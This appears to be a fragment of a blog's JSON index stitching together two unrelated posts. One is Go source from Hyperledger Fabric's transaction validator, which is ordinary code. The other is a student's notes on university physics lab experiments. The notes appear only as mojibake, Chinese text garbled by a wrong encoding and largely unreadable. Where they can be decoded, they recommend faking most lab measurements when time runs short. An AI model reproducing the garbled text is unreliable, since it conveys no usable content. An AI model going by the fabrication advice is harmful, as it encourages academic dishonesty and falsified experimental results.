additionally // we don\u0026#39;t have any means of verifying whether the transaction had the rights // to perform that write operation because in v1, system chaincodes do not have // any endorsement policies to speak of. So if the chaincode can\u0026#39;t be invoked // it can\u0026#39;t be written to by an invocation of an application chaincode if writesToNonInvokableSCC { return errors.Errorf(\u0026#34;chaincode %s attempted to write to the namespace of a system chaincode that cannot be invoked\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // validate *EACH* read write set according to its chaincode\u0026#39;s endorsement policy for _, ns := range wrNamespace { // Get latest chaincode version, vscc and validate policy txcc, vscc, policy, err := v.GetInfoForValidate(chdr, ns) if err != nil { logger.Errorf(\u0026#34;GetInfoForValidate for txId = %s returned error: %+v\u0026#34;, chdr.TxId, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // if the namespace corresponds to the cc that was originally // invoked, we check that the version of the cc that was // invoked corresponds to the version that lscc has returned if ns == ccID \u0026amp;\u0026amp; txcc.ChaincodeVersion != ccVer { err = errors.Errorf(\u0026#34;chaincode %s:%s/%s didn\u0026#39;t match %s:%s/%s in lscc\u0026#34;, ccID, ccVer, chdr.ChannelId, txcc.ChaincodeName, txcc.ChaincodeVersion, chdr.ChannelId) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_EXPIRED_CHAINCODE } // do VSCC validation ctx := \u0026amp;Context{ Seq: seq, Envelope: envBytes, Block: block, TxID: chdr.TxId, Channel: chdr.ChannelId, Namespace: ns, Policy: policy, VSCCName: vscc.ChaincodeName, } if err = v.VSCCValidateTxForCC(ctx); err != nil { switch err.(type) { case *commonerrors.VSCCEndorsementPolicyError: return err, peer.TxValidationCode_ENDORSEMENT_POLICY_FAILURE default: return err, peer.TxValidationCode_INVALID_OTHER_REASON } } } } else { // make sure that we can invoke this system chaincode - if the chaincode // cannot be invoked through a proposal to this peer, we have to drop the // transaction; if we didn\u0026#39;t, we wouldn\u0026#39;t know how to decide whether it\u0026#39;s // valid or not because in v1, system chaincodes have no endorsement policy if IsSysCCAndNotInvokableExternal(ccID) { return errors.Errorf(\u0026#34;committing an invocation of cc %s is illegal\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // Get latest chaincode version, vscc and validate policy _, vscc, policy, err := v.GetInfoForValidate(chdr, ccID) if err != nil { logger.Errorf(\u0026#34;GetInfoForValidate for txId = %s returned error: %+v\u0026#34;, chdr.TxId, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // validate the transaction as an invocation of this system chaincode; // vscc will have to do custom validation for this system chaincode // currently, VSCC does custom validation for LSCC only; if an hlf // user creates a new system chaincode which is invokable from the outside // they have to modify VSCC to provide appropriate validation ctx := \u0026amp;Context{ Seq: seq, Envelope: envBytes, Block: block, TxID: chdr.TxId, Channel: chdr.ChannelId, Namespace: ccID, Policy: policy, VSCCName: vscc.ChaincodeName, } if err = v.VSCCValidateTxForCC(ctx); err != nil { switch err.(type) { case *commonerrors.VSCCEndorsementPolicyError: return err, peer.TxValidationCode_ENDORSEMENT_POLICY_FAILURE default: return err, peer.TxValidationCode_INVALID_OTHER_REASON } } } logger.Debugf(\u0026#34;[%s] VSCCValidateTx completes env bytes %p\u0026#34;, chainID, envBytes) return nil, peer.TxValidationCode_VALID } func (v *VsccValidatorImpl) VSCCValidateTxForCC(ctx *Context) error { logger.Debug(\u0026#34;Validating\u0026#34;, ctx, \u0026#34;with plugin\u0026#34;) err := v.pluginValidator.ValidateWithPlugin(ctx) if err == nil { return nil } // If the error is a pluggable validation execution error, cast it to the common errors ExecutionFailureError. if e, isExecutionError := err.(*validation.ExecutionFailureError); isExecutionError { return \u0026amp;commonerrors.VSCCExecutionFailureError{Err: e} } // Else, treat it as an endorsement error. return \u0026amp;commonerrors.VSCCEndorsementPolicyError{Err: err} } func (v *VsccValidatorImpl) getCDataForCC(chid, ccid string) (*ccprovider.ChaincodeData, error) { l := v.cr.Ledger() if l == nil { return nil, errors.New(\u0026#34;nil ledger instance\u0026#34;) } qe, err := l.NewQueryExecutor() if err != nil { return nil, errors.WithMessage(err, \u0026#34;could not retrieve QueryExecutor\u0026#34;) } defer qe.Done() bytes, err := qe.GetState(\u0026#34;lscc\u0026#34;, ccid) if err != nil { return nil, \u0026amp;commonerrors.VSCCInfoLookupFailureError{ Reason: fmt.Sprintf(\u0026#34;Could not retrieve state for chaincode %s, error %s\u0026#34;, ccid, err), } } if bytes == nil { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] not found.\u0026#34;, ccid) } cd := \u0026amp;ccprovider.ChaincodeData{} err = proto.Unmarshal(bytes, cd) if err != nil { return nil, errors.Wrap(err, \u0026#34;unmarshalling ChaincodeQueryResponse failed\u0026#34;) } if cd.Vscc == \u0026#34;\u0026#34; { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] is invalid, vscc field must be set\u0026#34;, ccid) } if len(cd.Policy) == 0 { return nil, errors.Errorf(\u0026#34;lscc\u0026#39;s state for [%s] is invalid, policy field must be set\u0026#34;, ccid) } return cd, err } // GetInfoForValidate gets the ChaincodeInstance(with latest version) of tx, vscc and policy from lscc func (v *VsccValidatorImpl) GetInfoForValidate(chdr *common.ChannelHeader, ccID string) (*sysccprovider.ChaincodeInstance, *sysccprovider.ChaincodeInstance, []byte, error) { cc := \u0026amp;sysccprovider.ChaincodeInstance{ ChannelID: chdr.ChannelId, ChaincodeName: ccID, } vscc := \u0026amp;sysccprovider.ChaincodeInstance{ ChannelID: chdr.ChannelId, ChaincodeName: \u0026#34;vscc\u0026#34;, // default vscc for system chaincodes } var policy []byte var err error if !IsSysCC(ccID) { // when we are validating a chaincode that is not a // system CC, we need to ask the CC to give us the name // of VSCC and of the policy that should be used // obtain name of the VSCC and the policy cd, err := v.getCDataForCC(chdr.ChannelId, ccID) if err != nil { msg := fmt.Sprintf(\u0026#34;Unable to get chaincode data from ledger for txid %s, due to %s\u0026#34;, chdr.TxId, err) logger.Errorf(msg) return nil, nil, nil, err } cc.ChaincodeName = cd.Name cc.ChaincodeVersion = cd.Version vscc.ChaincodeName, policy = cd.Vscc, cd.Policy } else { // when we are validating a system CC, we use the default // VSCC and a default policy that requires one signature // from any of the members of the channel p := policydsl.SignedByAnyMember(v.cr.GetMSPIDs()) policy, err = protoutil.Marshal(p) if err != nil { return nil, nil, nil, err } } return cc, vscc, policy, nil } // txWritesToNamespace returns true if the supplied NsRwSet // performs a ledger write func (v *VsccValidatorImpl) txWritesToNamespace(ns *rwsetutil.NsRwSet) bool { // check for public writes first if ns.KvRwSet != nil \u0026amp;\u0026amp; len(ns.KvRwSet.Writes) \u0026gt; 0 { return true } // only look at collection data if we support that capability if v.cr.Capabilities().PrivateChannelData() { // check for private writes for all collections for _, c := range ns.CollHashedRwSets { if c.HashedRwSet != nil \u0026amp;\u0026amp; len(c.HashedRwSet.HashedWrites) \u0026gt; 0 { return true } // only look at private metadata writes if we support that capability if v.cr.Capabilities().KeyLevelEndorsement() { // private metadata updates if c.HashedRwSet != nil \u0026amp;\u0026amp; len(c.HashedRwSet.MetadataWrites) \u0026gt; 0 { return true } } } } // only look at metadata writes if we support that capability if v.cr.Capabilities().KeyLevelEndorsement() { // public metadata updates if ns.KvRwSet != nil \u0026amp;\u0026amp; len(ns.KvRwSet.MetadataWrites) \u0026gt; 0 { return true } } return false } func IsSysCCAndNotInvokableExternal(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; } func IsSysCC(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; || name == \u0026#34;lscc\u0026#34; || name == \u0026#34;qscc\u0026#34; || name == \u0026#34;cscc\u0026#34; } func IsSysCCAndNotInvokableCC2CC(name string) bool { return name == \u0026#34;vscc\u0026#34; || name == \u0026#34;escc\u0026#34; || name == \u0026#34;cscc\u0026#34; } ","date":"2020-12-08T01:33:07Z","permalink":"/post/fabric-architecture-and-systemchaincode/","title":"Fabric-Architecture-and-SystemChaincode"},{"content":"åˆ†å…‰ä»ª å®éªŒæ—¶é—´ï¼š2020å¹´9æœˆ21æ—¥\nè¿™æ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªå®éªŒï¼ŒæˆåŠŸAKï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰\nè°ƒæ•´ ç¬¬ä¸€æ­¥çš„ç²—è°ƒéå¸¸é‡è¦ï¼Œå†³å®šäº†ä½ æ¥ä¸‹æ¥çš„è°ƒæ•´é€Ÿåº¦ã€‚ä¸ªäººç»éªŒæ˜¯åœ¨å®éªŒå‰åƒä¸‡ä¸è¦å»ç©é‚£äº›èºä¸ï¼Œä¹Ÿè®¸ä¸Šä¸ªäººå·²ç»è°ƒå¥½äº†ï¼Œä¸Šæ¥éšä¾¿è°ƒä¸€è°ƒå°±åˆæ ¼ï¼Œå¯ä»¥ç›´æ¥åšå®éªŒã€‚\næŒ‰ç…§æ­£å¸¸çš„æ–¹æ³•å»è°ƒæ•´å°±è¡Œï¼Œé‡åˆ°çš„å”¯ä¸€å›°éš¾å°±æ˜¯è½¬180Â°åæ‰¾ä¸åˆ°ç»¿åå­—äº†ï¼Œè¿™æ—¶å¯ä»¥è€ƒè™‘å…ˆç”¨çœ¼ç›å»æ‰¾ï¼Œç¡®å®šäº†ç»¿åå­—åå°„å›æ¥çš„ä½ç½®ä¹‹åå†å»è°ƒç›®é•œå’Œå¹³å°ï¼Œåé¢æŒ‰ç…§è§†é¢‘é‡Œæˆ–è€…è€å¸ˆè®²çš„åšå°±å¯ä»¥ï¼Œåº”è¯¥æ²¡ä»€ä¹ˆéš¾åº¦ã€‚\næµ‹é‡ä¸‰æ£±é•œçš„é¡¶è§’ è¿™ä¸ªå®éªŒè¿˜æ˜¯æŒºæ°´çš„ã€‚ã€‚ã€‚éšä¾¿æµ‹æµ‹å°±è¡Œäº†ã€‚é¡¶è§’æ˜¯60Â°ï¼Œæµ‹é‡ç»“æœåº”è¯¥æ˜¯120Â°\næœ€å°åå‘è§’æ³•æµ‹é‡æ£±é•œçš„æŠ˜å°„ç‡ è¿™ä¸ªå®éªŒæœ€å¤§çš„å‘å°±æ˜¯â€œæœ€å°åå‘è§’â€ä¸€å®šè¦æ—‹è½¬ä¸‰æ£±é•œçš„æ‘†æ”¾ä½ç½®ï¼Œç›´åˆ°æŠ˜å°„å…‰çš„åè½¬æœ€å°ã€‚ï¼ˆæŠ˜å°„å…‰åœ¨å³æ‰‹è¾¹å°±è®©å…‰å°½å¯èƒ½é å·¦ï¼Œå·¦æ‰‹è¾¹å°±å°½å¯èƒ½é å³ï¼‰\nåé¢åº”è¯¥å°±ä¸éœ€è¦å»åŠ¨ä¸‰æ£±é•œäº†ï¼Œé’ å…‰çš„å…¥å°„å…‰åº”è¯¥æ˜¯å¯ä»¥æ‰¾åˆ°çš„ã€‚\næœ€ç»ˆçš„æµ‹é‡ç»“æœåº”è¯¥åœ¨50Â°50â€²å·¦å³ã€‚\næ å…¥å°„æ³•æµ‹é‡æ£±é•œçš„æŠ˜å°„ç‡ å½“æ—¶åšè¿™ä¸ªå®éªŒçš„æ—¶å€™ä¸»è¦æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‘†æ”¾ã€‚ã€‚ã€‚å¥½åœ¨æœ€åæ‰¾äº†ä¸ªåšè¿‡çš„å¤§ä½¬ï¼Œç”»äº†ä¸ªè‰å›¾ã€‚\næœ€ç»ˆçš„æµ‹é‡ç»“æœåº”è¯¥åœ¨39Â°å·¦å³ã€‚\nå¦‚æœæ—¶é—´ä¸å¤Ÿç”¨çš„è¯ï¼Œä¸€ä¸ªçœæ—¶é—´çš„æŠ€å·§æ˜¯åœ¨æµ‹ä¸‹ä¸€ç»„æ•°æ®çš„æ—¶å€™ä¸åŠ¨ç›®é•œï¼Œåªè½¬åŠ¨åˆ»åº¦ç›˜ï¼Œè¿™æ ·å°±å¯ä»¥å°‘è°ƒæ•´ä¸€æ¬¡ã€‚ï¼ˆå¦‚æœå½»åº•æ²¡æœ‰æ—¶é—´äº†ï¼Œé‚£å°±æµ‹é‡ä¸€ç»„ï¼Œç„¶åå†™åˆ°ç¬¬äº”ç»„çš„ä½ç½®ä¸Šï¼Œå‰©ä¸‹çš„æ•°æ®å…¨é ç¼–ã€‚æˆ‘å®¤å‹å°±è¿™ä¹ˆç¡¬æ°´è¿‡çš„ã€‚ã€‚ã€‚ï¼‰\nå¹²æ¶‰æ³•æµ‹å¹³æ¿ç»ç’ƒæŠ˜å°„ç‡ è¿™ä¸ªå®éªŒåšäº†ä¹Ÿä¸ç®—ç§¯åˆ†ï¼Œè€Œä¸”è‡³å°‘è¦1å°æ—¶çš„æ—¶é—´ï¼Œæ‰€ä»¥å°±æ²¡åšï¼ˆä¹Ÿæ²¡äººåšï¼‰ã€‚\nç¤ºæ³¢å™¨ å®éªŒæ—¶é—´ï¼š2020å¹´10æœˆ26æ—¥\nåšçš„ç¬¬ä¸€ä¸ªéå…‰å­¦å®éªŒï¼ˆç»ªè®ºé™¤å¤–ï¼‰ï¼Œæ²¡èƒ½AKï¼Œåé¢å°±å†³å®šé‡å›å…‰å­¦çš„æ€€æŠ±äº†ã€‚\nç¤ºæ³¢å™¨çš„ä½¿ç”¨ è¿™ä¸ªè¿˜æ˜¯æŒºç®€å•çš„ï¼Œä½†å»ºè®®é€Ÿåº¦ä¸€å®šè¦å¿«ï¼Œç»™åé¢ä¸¤ä¸ªå®éªŒç•™ç‚¹æ—¶é—´ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå®éªŒè€å¸ˆæ˜¯ä¼šæŸ¥ç°è±¡çš„ï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦å°è¯•å»æ°´ã€‚å…¶å®æ°´çš„ç›®çš„ä¸æ˜¯æ··åˆ†ï¼Œéƒ½æ˜¯ç°è±¡åšå‡ºæ¥äº†ï¼Œåªæ˜¯æ—¶é—´ä¸å¤Ÿæ—¶çš„ä¸€ä¸ªæ‰‹æ®µè€Œå·²ï¼Œéå¸¸ä¸å»ºè®®æ»¥ç”¨ï¼Œæ¯•ç«Ÿåšå‡ºå®éªŒç°è±¡è¿˜æ˜¯å¾ˆçˆ½çš„ã€‚\näºŒæç®¡ä¼å®‰ç‰¹æ€§æ›²çº¿ å½“æ—¶æŒ‰ç…§ç”µè·¯å›¾è¿äº†ç”µè·¯ï¼Œç»“æœå‘ç°çº¿è²Œä¼¼ä¸å¤Ÿç”¨ï¼Œæ‰“ç®—å…ˆæµ‹é‡å£°é€Ÿã€‚\nç„¶åå°±æ²¡æœ‰ç„¶åäº†\nå£°é€Ÿæµ‹é‡ æµ‹é‡å£°é€Ÿçš„æ—¶å€™é‡åˆ°äº†å¥½å‡ ä¸ªå‘ã€‚\nå®éªŒå‰å’Œå®éªŒåä¸€å®šè¦è®°å¾—è°ƒæ•´é¢‘ç‡ï¼Œä½¿å¾—æŒ¯å¹…æœ€å¤§ï¼Œå¹¶è®°å½•ä¸‹æ¥ã€‚ å®éªŒçš„çº¿æå’Œå™¨ææœ‰æ¯’ï¼Œå„ç§è¿æ¥ä¸ç¨³å®šï¼Œæœ€åæ˜¯ç”¨ç¬”è¢‹æ”¯æ’‘ç€çº¿æ‰èƒ½åšå®éªŒçš„ã€‚ æˆ‘å½“æ—¶è€å¸ˆè¦æ±‚æŒ¯å¹…æ³•å’Œæè¨å¦‚æ³•éƒ½è¦ç”¨ï¼Œå¾ˆè€½è¯¯æ—¶é—´ï¼Œå»ºè®®å…ˆåšç¬¬äºŒä¸ªå®éªŒã€‚ä¸è¿‡æˆ‘å½“æ—¶çš„è€å¸ˆäººæ¯”è¾ƒå¥½ï¼Œè®©æˆ‘ä»¬å‡ ä¸ªäººæ‹–å»¶äº†ä¸€ä¼šï¼Œç¡¬æ˜¯æŠŠæ•°æ®è®°å®Œäº†ï¼Œè€Œä¸”æ²¡æœ‰æŸ¥å®éªŒå™¨æã€‚ è¿ˆå…‹å°”é€Šå¹²æ¶‰ å®éªŒæ—¶é—´ï¼š2020å¹´11æœˆ9æ—¥\nç¬¬äºŒä¸ªå…‰å­¦å®éªŒï¼Œä¹ŸAKäº†ã€‚è®©äººä¸ç¦æ„Ÿå¹ï¼Œå…‰å­¦å®éªŒçœŸçš„æ˜¯é€‚åˆåˆ·ç§¯åˆ†å•Šã€‚\nè¿ˆå…‹å°”é€Šå¹²æ¶‰ è¿™ä¸ªå®éªŒè€å¸ˆä¼šè®²å¥½ä¹…ï¼ˆä½†é‡Œé¢æœ‰ä¸å°‘å¹²è´§ï¼Œå»ºè®®è®¤çœŸå¬ï¼‰ï¼Œæˆ‘å½“æ—¶è¶³è¶³è®²äº†1å°æ—¶20åˆ†é’Ÿï¼Œè®²åˆ°æœ€åæˆ‘éƒ½ç›´æ¥å¼€æ¿€å…‰å·å·è°ƒæ•´äº†ã€‚\næ•´ä¸ªè°ƒæ•´æ­¥éª¤æœ‰å››æ­¥ï¼Œä¸€æ­¥ä¸€æ­¥æ¥å°±è¡Œï¼Œåˆ«å¿˜äº†ç¬¬ä¸€æ­¥æ˜¯è°ƒæ¿€å…‰å…¥å°„å…‰å°±è¡Œï¼ˆæˆ‘åšå®Œå®éªŒæ‰å‘ç°è¿™ä¸ªäº‹æƒ…ï¼Œè¿˜å¥½æœ€åæ²¡å‡ºç°é—®é¢˜ï¼‰ã€‚å¦‚æœå‘ç°è‡ªå·±æ‰¾ä¸åˆ°æ°´å¹³ä¸€æ’çš„ä¸‰ä¸ªäº®ç‚¹ï¼Œå¯èƒ½æ˜¯å…¥å°„å…‰æ²¡æœ‰å®Œå…¨å°„åˆ°å„ä¸ªé•œå­ä¸Šï¼Œè°ƒæ•´çš„æ—¶å€™å‡ºç°é—®é¢˜äº†è¿˜æ˜¯åŠ¨è„‘å­æƒ³ä¸€æƒ³å§ï¼Œæ¯•ç«Ÿé‡åˆ°çš„é—®é¢˜çœŸçš„æ˜¯å„ç§å„æ ·çš„éƒ½æœ‰ã€‚\nå¦‚æœå‘ç°è¿ˆå…‹å°”é€Šç¯å¾ˆå¯†çš„è¯ï¼Œå¯èƒ½æ˜¯åå°„é•œä½ç½®ä¸å¤ªå¯¹ï¼Œè°ƒæ•´åˆ°è€å¸ˆæ¨èçš„ä½ç½®ï¼Œç„¶åæ‹§ä¸€æ‹§åº”è¯¥å°±èƒ½å‡ºæ¥ã€‚\nè£…ç½®çš„ç©ºç¨‹å·®çœŸçš„è®©äººç»æœ›ï¼Œæˆ‘ä¸€å¼€å§‹å¤§æ¦‚è½¬äº†60åœˆæ‰æ¶ˆé™¤æ‰ï¼Œ\næ•°çš„æ—¶å€™çœŸçš„å¯èƒ½ä¼šæ•°é”™ã€‚ã€‚ã€‚å»ºè®®åä¸ªåä¸ªæ•°ã€‚æŠ€å·§å°±æ˜¯ä¸€å®šè¦æ•°å†…ç¼©ç¯ï¼Œå¤–æ‰©çœŸçš„çº ç»“åº”è¯¥æ•°åˆ°å“ªé‡Œã€‚\nç‰›é¡¿ç¯å¹²æ¶‰ æ„Ÿè§‰ç‰›é¡¿ç¯æ˜¯æœ€ç®€å•çš„å®éªŒäº†ï¼Œåªéœ€è¦è°ƒå¥½åå°„é•œçš„ä½ç½®å’Œç›®é•œçš„é«˜åº¦å°±è¡Œã€‚é‡ç‚¹æ˜¯ä¸è¦æ•°é”™ç¯ï¼Œæˆ‘å½“æ—¶æ˜¯ä»11æ•°åˆ°20ã€‚ã€‚ã€‚å»ºè®®ä»6æ•°åˆ°15ã€‚\næ•°é”™äº†é‡æ–°æ•°å…¶å®ä¹Ÿæµªè´¹ä¸äº†å¤šå°‘æ—¶é—´ï¼Œå¦‚æœæ‡’çš„è¯å°±ç»§ç»­ç¼–æ•°æ®å¤§æ³•å§ã€‚ã€‚ã€‚\nåŠˆå°–å¹²æ¶‰ è¿™ä¸ªå®éªŒçš„åŠˆå°–å¹²æ¶‰åº”è¯¥æ˜¯æ¥å¾—åŠåšçš„ï¼Œæˆ‘å½“æ—¶æœ€åæœ‰å‡ ååˆ†é’Ÿçš„æ—¶é—´æ¥çº ç»“åº”è¯¥æ€ä¹ˆåšï¼ˆå…¶å®æƒ³æ³•ä¸€ç›´éƒ½æ²¡é—®é¢˜ï¼Œä½†æˆ‘çš„ä»ªå™¨æµ‹é‡èŒƒå›´æœ‰é—®é¢˜ï¼Œæµªè´¹äº†å·¨é‡æ—¶é—´ï¼‰ã€‚å½“æ—¶è®¤è¯†çš„å¤§ä½¬æ²¡åšè¿™ä¸ªå®éªŒï¼Œäºæ˜¯åªèƒ½è‡ªå·±æ‘¸ç´¢äº†ã€‚ä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„å®éªŒæ­¥éª¤ã€‚\næœ¬å®éªŒçš„æ ·æœ¬æ— é¡»è‡ªå·±åˆ¶ä½œã€‚\nåšå®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„å”¯ä¸€éšœç¢åœ¨äºæµ‹é‡â€œç»†ä¸ä½ç½®åˆ°å°–ç«¯çš„è·ç¦»â€ã€‚æˆ‘é‡åˆ°çš„æ ·æœ¬ä¸ºä¸€å¼ çº¸ï¼Œå› æ­¤ä¸å›¾ç‰‡ä¸­çš„ç»†ä¸æœ‰äº›å°å·®åˆ«ã€‚å®é™…æ“ä½œä¸­çš„è£…ç½®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå·¦ä¾§æ˜¯å°–ç«¯ï¼Œå³ä¾§çš„å°æ¨ªçº¿æ˜¯çº¸å¼ ï¼‰ã€‚å›¾ç‰‡ä¸­çš„Lå°±æ˜¯éœ€è¦æµ‹é‡çš„éƒ¨åˆ†ã€‚å…·ä½“åšæ³•å¤§è‡´å°±æ˜¯æŠŠè£…ç½®ä¾§è¿‡æ¥ï¼Œæ˜¾å¾®é•œå¯¹ç„¦ï¼Œç„¶åä»å°–ç«¯é‡åˆ°çº¸å¼ å³å¯ã€‚\næˆ‘ç”¨çš„ä»ªå™¨è²Œä¼¼æœ‰é—®é¢˜ã€‚ã€‚ã€‚å°äº25mmçš„éƒ¨åˆ†æ‰‹è½®è½¬ä¸è¿‡å»ï¼Œæœ€åè¿˜æ˜¯å€Ÿå®¤å‹çš„ä»ªå™¨åšçš„\u0026hellip;\u0026hellip;\nåœ¨æµ‹é‡å¹²æ¶‰æ¡çº¹å®½åº¦æ—¶ï¼Œæ˜¾å¾®é•œç‰©é•œå¯èƒ½ä¼šè¢«èºä¸å¡ä½ï¼Œå»ºè®®æŠŠè£…ç½®å€’è¿‡æ¥æµ‹é‡ï¼ŒæŠŠå››ä¸ªçªå‡ºæ¥çš„èºä¸æ”¾åœ¨ä¸‹é¢å½“æ”¯æŸ±ã€‚ã€‚ã€‚\næˆ‘çš„æµ‹é‡ç»“æœæ˜¯$L\\approx39\\ \\mathrm{mm}$, $n=5$æ—¶$l\\approx5.6\\ \\mathrm{mm}$ã€‚åæ­£æœ€åå¤„ç†æ—¶åˆ«å¿˜äº†è¿˜æœ‰ä¸ª$n$å°±è¡Œï¼Œåˆšå¼€å§‹ç®—å‡ºæ¥çš„ç»“æœç»™æˆ‘äººéƒ½çœ‹å‚»äº†ï¼Œæœ€åç®—çš„å¤§æ¦‚æ˜¯$50\\mu m$ï¼Œæ„Ÿè§‰å°äº†ä¸€äº›ï¼Œä¸è¿‡è‡³å°‘è¿˜æœ‰ç‚¹é è°±ã€‚\né’ å…‰å¹²æ¶‰ æ—¶é—´ï¼š2020å¹´11æœˆ16æ—¥\nç¬¬ä¸‰ä¸ªå…‰å­¦å®éªŒï¼Œç¬¬ä¸€ä¸ªéå¿…ä¿®å®éªŒã€‚\nè¿™æ¬¡æ²¡æœ‰AKï¼ˆè¿™å¥è¯å¯¼è‡´æˆ‘é™©äº›è¢«å®¤å‹æš´æ‰“ï¼‰ã€‚è¿˜æ˜¯å¤§æ„äº†ï¼Œæ²¡æœ‰é—ªã€‚\né’ å…‰åŒæ£±é•œ æœ¬å®éªŒçš„ä»ªå™¨è°ƒæ•´æ­¥éª¤å¾ˆå‘ï¼Œè€½è¯¯äº†å·¨é‡æ—¶é—´ã€‚ã€‚ã€‚æœ€ååªèƒ½å¡ç‚¹å¼ºè¡Œæå®ŒåŒæ£±é•œçš„å®éªŒã€‚\næˆ‘æœ€åæ€»ç»“çš„è°ƒæ•´æ–¹æ³•ï¼š\nå‰é¢ç”¨pptæˆ–è€…ä¹¦ä¸Šçš„æ–¹æ³•éƒ½è¡Œï¼Œæ¯•ç«Ÿå„ä¸ªå…ƒå™¨ä»¶çš„é«˜åº¦ä¹‹ç±»çš„è¿˜æ˜¯æ¯”è¾ƒå¥½è°ƒçš„ã€‚ åˆ°æœ€åæ‰¾å¤§å°åƒå’Œå¹²æ¶‰æ¡çº¹æ—¶ï¼Œä¸€å®šè¦å…ˆæ‰¾å¹²æ¶‰æ¡çº¹ï¼Œè€å¸ˆä¹Ÿå¼ºè°ƒäº†ï¼Œä½†æ²¡è¯´æ€ä¹ˆæ“ä½œã€‚ã€‚ã€‚æå¾—æˆ‘å„ç§å‰åç§»åŠ¨æœ€åè¿˜æ˜¯æ‰¾ä¸åˆ°ã€‚æœ€åå‘ç°æ˜¯åŒæ£±é•œå’Œç‹­ç¼ä¸å¹³è¡Œæ‰€å¯¼è‡´çš„ã€‚ æœ€å¥½çš„æ–¹æ³•æ˜¯å…ˆå‚è€ƒåˆ«äººçš„æŠ¥å‘Šæ‘†æ”¾å¥½ç‹­ç¼å’ŒåŒæ£±é•œçš„ä½ç½®ï¼ˆè¿™æ ·å¯ä»¥ç¡®ä¿æœ‰20ä¸ªæ¡çº¹ï¼‰ï¼Œè®©ç›®é•œç´§è´´åŒæ£±é•œï¼Œæ—‹è½¬åŒæ£±é•œæˆ–è°ƒæ•´ç‹­ç¼å®½åº¦ä»¥æ‰¾åˆ°æ¸…æ™°çš„å¹²æ¶‰æ¡çº¹ï¼Œå†æŠŠç›®é•œæ‹‰åˆ°æ­£ç¡®çš„ä½ç½®ï¼Œæ‰¾å¤§å°åƒå¹¶æŠŠå‰ä¸è°ƒåˆ°ä¸­å¿ƒã€‚ å®éªŒå®¤çš„åŒæ£±é•œä¸ŠåŠéƒ¨åˆ†æ˜¯ç©ºçš„ï¼Œä¼šæ¼å…‰ã€‚æ‰€ä»¥å¦‚æœå‘ç°ç›®é•œæ‹‰è¿œåå¹²æ¶‰æ¡çº¹è¢«å…‰ç›–ä½äº†ï¼Œå¯ä»¥è¯•è¯•æŠŠåŒæ£±é•œä½ç½®æé«˜ä¸€ç‚¹ã€‚ å¦å¤–ï¼Œæ„Ÿè§‰ç›®é•œæ‰‹è½®çš„4å’Œ5å¾ˆå®¹æ˜“è¯»é”™ï¼Œè¯»çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„ä¸€ç‚¹ã€‚ä»ªå™¨çš„ä½ç½®æœ€å¥½å’Œå·²æœ‰å®éªŒæŠ¥å‘Šçš„ä½ç½®å·®ä¸å¤šï¼Œå¯ä»¥å¯¹ç€åˆ«äººçš„æ•°æ®æ£€æŸ¥ï¼Œä¸ç„¶æœ€åæ•°æ®åå·®è¿‡å¤§å°±å‚»äº†ã€‚è¿™ç§ä¸œè¥¿èƒ½æ°´è¿‡å»å°±å°½é‡æ°´è¿‡å»å§ã€‚ã€‚ã€‚\né’ å…‰åŠ³åŸƒé•œ å‹‰å¼ºåšå®ŒåŒæ£±é•œï¼Œggã€‚ç¥xdmå¥½è¿ã€‚\nç¨³æ€æ³•æµ‹ä¸è‰¯å¯¼ä½“çƒ­å¯¼ç‡ æ—¶é—´ï¼š2020å¹´12æœˆ5æ—¥\nç¬¬ä¸€ä¸ªçƒ­å­¦å®éªŒï¼Œè‹±æ–‡å®éªŒ+ç ”ç©¶æ€§å®éªŒ\nçƒ­å­¦å®éªŒå°±ç¦»è°±ã€‚æŠŠè£…ç½®è°ƒå¥½ä¹‹åç­‰ç€å°±è¡Œäº†ï¼Œå»ºè®®å¸¦ä¸ªä½œä¸šå»å†™ï¼Œæˆ–è€…æŠŠå™¨æçš„æ•°æ®ç®€å•å¤„ç†ä¸€ä¸‹ã€‚å¤§æ¦‚å¾—ç­‰1ä¸ªå¤šå°æ—¶å§ï¼ŒåŠ çƒ­ç›˜æ¸©åº¦åˆ°è¾¾75â„ƒä¹‹åå†ç­‰æ•£çƒ­ç›˜æ¸©åº¦ç¨³å®šå°±è¡Œäº†ã€‚å®é™…æ“ä½œçš„æ—¶å€™ä¸ä¸€å®šéè¦åˆ°75â„ƒï¼Œæ¯•ç«Ÿç¤ºæ•°ä¼šæœ‰è¯¯å·®ï¼ŒåŠ åˆ°74.9â„ƒä¹‹åå‘ç°ä¸€ç›´æ²¡å˜åŒ–å°±å¯ä»¥è®°å½•äº†ã€‚ï¼ˆè¯•éªŒå°åœ¨è¿‡é“è¾¹ä¸Šæ˜¯çœŸçš„å‘ï¼Œèµ°æ¥èµ°å»çš„å¯¹å®éªŒç»“æœçœŸçš„æœ‰å½±å“ï¼‰\nè‹±æ–‡å®éªŒç†Ÿæ‚‰äº†è€å¸ˆçš„å£è¯­ä¹‹åè¿˜æ˜¯å¯ä»¥å¬æ‡‚çš„ã€‚æˆ‘å½“æ—¶çš„è€å¸ˆäººå¾ˆå¥½ï¼Œå’Œä»–è¯´äº†æƒ³åšç 